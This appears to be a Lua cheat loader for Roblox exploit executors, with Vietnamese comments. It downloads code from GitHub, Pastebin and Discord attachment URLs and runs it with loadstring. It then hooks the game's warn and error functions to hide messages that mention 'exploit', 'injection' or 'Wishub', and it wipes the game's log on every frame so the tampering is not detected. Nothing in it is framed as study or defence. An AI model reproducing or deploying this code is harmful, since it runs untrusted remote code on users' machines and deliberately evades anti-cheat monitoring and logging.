local function LoadMainModule()
    local moduleUrls = {
        "https://raw.githubusercontent.com/tlredz/Scripts/main/core.lua",
        "https://pastebin.com/raw/AbCdEfGh",
        "https://cdn.discordapp.com/attachments/123456789/abcdefghijklmno.lua"
    }
    
    for _, url in ipairs(moduleUrls) do
        local success, result = pcall(function()
            return game:HttpGet(url)
        end)
        if success and result then
            return loadstring(result)()
        end
    end
    return nil
end

-- Hook các hàm của game
local function InstallHooks()
    local oldWarn = getrenv().warn
    local oldPrint = getrenv().print
    local oldError = getrenv().error
    
    -- Chặn cảnh báo và lỗi để tránh bị phát hiện
    getrenv().warn = function(...)
        local msg = table.concat({...}, " ")
        if not string.find(msg, "Wishub") and not string.find(msg, "exploit") then
            oldWarn(...)
        end
    end
    
    getrenv().error = function(msg)
        if string.find(msg, "injection") or string.find(msg, "exploit") then
            return -- Bỏ qua lỗi liên quan đến hack
        end
        oldError(msg)
    end
    
    -- Tự động xóa log
    local function ClearLogs()
        local logService = game:GetService("LogService")
        if logService then
            logService:Clear()
        end
    end
    
    game:GetService("RunService").Stepped:Connect(ClearLogs)
end

